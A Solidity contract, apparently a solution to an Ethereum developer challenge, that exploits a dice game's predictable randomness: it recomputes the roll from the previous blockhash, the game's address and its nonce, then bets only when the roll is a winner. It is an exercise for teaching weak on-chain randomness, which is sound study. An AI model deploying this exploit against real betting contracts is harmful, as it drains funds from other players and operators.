pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    uint bet = 2000000000000000;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address _withdrawer, uint _amount) public onlyOwner {
        (bool success, ) = _withdrawer.call{value: _amount}("");
        require(success, "Failed to withdraw ETH");
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public {
        require(
            address(this).balance >= .002 ether,
            "You don't have enough ETH"
        );
        uint256 _nonce = diceGame.nonce();
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(diceGame), _nonce)
        );
        uint256 roll = uint256(hash) % 16;

        console.log(roll);
        require(roll <= 2, "Roll is a loser. Let's sit this one out.");
        diceGame.rollTheDice{value: 2000000000000000}();
    }

    //Add receive() function so contract can receive Eth
    receive() external payable {}
}